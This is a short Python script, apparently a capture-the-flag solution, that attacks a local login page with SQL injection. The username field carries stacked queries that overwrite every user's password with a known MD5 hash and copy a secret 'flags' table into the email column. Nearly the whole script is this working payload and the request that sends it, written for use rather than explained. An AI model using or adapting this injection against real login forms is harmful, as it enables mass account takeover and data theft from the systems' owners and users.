import requests
import hashlib
import re 

# Define the URLs for registration and login

login_url = "http://localhost:7009/login"

password = "Get_Haxxed"
hashed_password = hashlib.md5(password.encode()).hexdigest()
#e77c40a4dfe0727e1f28e38754b6dd84
print(hashed_password)
#Username to get injected

Modify_email = f"""admin"-- ');UPDATE users SET password ="{hashed_password}";UPDATE users SET email=(select flag from flags);-- -"""
print(Modify_email)

modify_data = {
    "username": Modify_email,
    "password": password
}



response = requests.post(login_url, data=modify_data)

if response.status_code == 200:
    print("Login successful.")
    content = response.content.decode('utf-8')
    print(response.content)
else:
    print(f"Login failed. Status Code: {response.status_code}")
    print(f"Login Response: {response.text}")